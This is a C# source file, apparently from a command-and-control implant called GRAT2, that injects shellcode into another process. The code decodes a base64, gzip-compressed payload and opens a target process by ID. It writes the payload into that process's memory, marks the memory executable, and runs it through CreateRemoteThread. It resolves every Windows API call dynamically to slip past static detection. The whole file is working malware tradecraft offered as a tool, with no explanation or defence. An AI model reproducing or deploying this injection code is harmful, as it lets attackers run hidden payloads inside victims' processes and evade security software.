using System;
using System.Runtime.InteropServices;
using GRAT2_Client.DInvoke;
using GRAT2_Client.PInvoke;

namespace GRAT2_Client.Injectious
{
    class DCreateRemThread
    {
        public static string Dynamic_InjectCreateRemThread(string[] arguments)
        {
            byte[] buffer = DecGzip.DecompressGzipped(Convert.FromBase64String(arguments[1]));
            int targetId = Int32.Parse(arguments[2]);

            IntPtr lpNumberOfBytesWritten = IntPtr.Zero;
            IntPtr lpThreadId = IntPtr.Zero;
            uint oldProtect = 0;


            GCHandle handle = GCHandle.Alloc(buffer, GCHandleType.Pinned);
            IntPtr pinnedBuffer = handle.AddrOfPinnedObject();

            try
            {
                var pointer = DynamicInvokeClass.GetLibraryAddress("kernel32.dll", "OpenProcess");
                var openProcess = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DInterop.OpenProcess)) as DInterop.OpenProcess;
                var hProcess = openProcess((uint)flags.ProcessAccessRights.All, false, (uint)targetId);
                
                pointer = DynamicInvokeClass.GetLibraryAddress("kernel32.dll", "VirtualAllocEx");
                var virtualAllocEx = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DInterop.VirtualAllocEx)) as DInterop.VirtualAllocEx;
                var alloc = virtualAllocEx(hProcess, IntPtr.Zero, buffer.Length, (uint)flags.MemAllocation.MEM_COMMIT, (uint)flags.MemProtect.PAGE_READWRITE);

                pointer = DynamicInvokeClass.GetLibraryAddress("kernel32.dll", "WriteProcessMemory");
                var writeProcessMemory = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DInterop.WriteProcessMemory)) as DInterop.WriteProcessMemory;
                writeProcessMemory(hProcess, alloc, pinnedBuffer, buffer.Length, out lpNumberOfBytesWritten);

                pointer = DynamicInvokeClass.GetLibraryAddress("kernel32.dll", "VirtualProtectEx");
                var virtualProtectex = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DInterop.VirtualProtectEx)) as DInterop.VirtualProtectEx;
                virtualProtectex(hProcess, alloc, buffer.Length, (uint)flags.MemProtect.PAGE_EXECUTE_READ, out oldProtect);

                pointer = DynamicInvokeClass.GetLibraryAddress("kernel32.dll", "CreateRemoteThread");
                var createRemoteThread = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DInterop.CreateRemoteThread)) as DInterop.CreateRemoteThread;
                createRemoteThread(hProcess, IntPtr.Zero, 0, alloc, IntPtr.Zero, 0, out lpThreadId);

                handle.Free();

            }
            catch (Exception ex)
            {
                return ex.Message;
            }

            return null;

        }
    }
}
